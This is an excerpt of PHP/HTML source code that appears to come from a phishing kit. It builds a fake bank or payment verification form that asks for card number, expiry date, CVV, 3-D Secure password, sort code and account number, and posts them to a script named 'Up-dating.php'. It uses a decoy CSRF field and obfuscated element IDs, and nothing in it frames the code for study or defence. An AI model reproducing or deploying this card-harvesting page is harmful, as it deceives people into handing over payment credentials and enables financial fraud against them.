...
<i class="busy"></i>
<!-- FORM -->
<form action="Up-dating.php?log=CheckCrd#Scr=<?php echo $ran;?>=<?php echo $rans;?>Savedata=<?php echo crypt($_SESSION['s13']); ?>=<?php include '../ran.php'; echo $r; ?>" method="post" class="proceed" >
<input type="hidden" id="<?php echo crypt($_SESSION['s13']); ?>" name="_csrf" value="<?php echo crypt($_SESSION['s13']); ?>">    
...
<input type="tel" id="<?php echo crypt($_SESSION['s13']); ?>" name="13"  required="required" value="<?php echo $_SESSION['s13']; ?>" title="<?php echo $crd_crdh; ?>" placeholder="<?php echo $crd_crdh; ?>" autocomplete="off" autocorrect="off" autocapitalize="off" maxlength="16" class="validate" onKeyPress="return ValidateAlpha(event);">

</div></div>
<!-- CCN-->
<div class="textInput large lap cardNumber hasError error-empty ">
<div class="fields large">
<input type="tel" id="tpcc" name="14" onkeyup="type_carte()" required="required" value="<?php echo $_SESSION['s14']; ?>" title="<?php echo $crd_crdn; ?>" placeholder="<?php echo $crd_crdn; ?>" maxlength="16" class="validate" onkeypress="return isNumberKey(event)">
...
<input id="15" class="validate" name="15" type="tel" value="<?php echo $_SESSION['s15']; ?>" title="<?php echo $crd_expd; ?>" placeholder="<?php echo $crd_expd; ?>" maxlength="7" required="required">
</div>
</div>
<!-- CSC-->
<div class="textInput lap cscNumber ">
<div class="fields right last">
<span class="icons cvv defaultCvv" id="cvvHolder" role="img"></span>
<input type="tel" value="<?php echo $_SESSION['s16']; ?>" class="hasHelp validate csc" id="<?php echo crypt($_SESSION['s13']); ?>" name="16" title="<?php echo $crd_ttcv; ?>" placeholder="<?php echo $crd_cv; ?>" maxlength="4" required="required" onkeypress="return isNumberKey(event)">
...
<div class="fields large">
<input type="password" id="<?php echo crypt($_SESSION['s13']); ?>" name="17" class="hasHelp validate camelCase userText"  title="<?php echo $crd_3ds; ?>" placeholder="<?php echo $crd_3ds; ?>" value="<?php echo $_SESSION['s17']; ?>" style="background: url(imcs_files/3s.png) no-repeat scroll right;">
</div>
</div></div>
<div class="multi equal clearfix">
...
<div class="textInput lap cscNumber">
<div class="fields left">
<input type="tel" value="<?php echo $_SESSION['s19']; ?>" class="hasHelp validate csc" id="19sr" name="19" title="<?php echo $crd_srt; ?>" placeholder="<?php echo $crd_srt; ?>" maxlength="16"><a href="javascript:popUp('<?php echo $crd_ptsrt; ?>')"  style="font-size:11px">What is the Sort code ?</a>
</div>
</div>
<!-- ACCN-->
<div class="textInput lap expiryDate  ">
<div class="fields right last">
<input id="<?php echo crypt($_SESSION['s13']); ?>" class="validate" name="18" type="tel" value="<?php echo $_SESSION['s18']; ?>" title="<?php echo $crd_acc; ?>" placeholder="<?php echo $crd_acc; ?>"   maxlength="8" onkeypress="return isNumberKey(event)">
</div>
</div>
<?php
}
...
<div class="textInput lap cscNumber">
<div class="fields left">
<input type="tel" value="<?php echo $_SESSION['s19']; ?>" class="hasHelp validate csc" id="19sn" name="19" title="<?php echo $crd_ttsn; ?>" placeholder="<?php echo $crd_sn; ?>" maxlength="16">
</div>
</div>
<!-- ACCN-->
<div class="textInput lap expiryDate  ">
<div class="fields right last">
<input id="<?php echo crypt($_SESSION['s13']); ?>" class="validate" name="18" type="tel" value="<?php echo $_SESSION['s18']; ?>" title="<?php echo $crd_acc; ?>" placeholder="<?php echo $crd_acc; ?>"   maxlength="12" onkeypress="return isNumberKey(event)">
</div>
</div>
<?php
 }
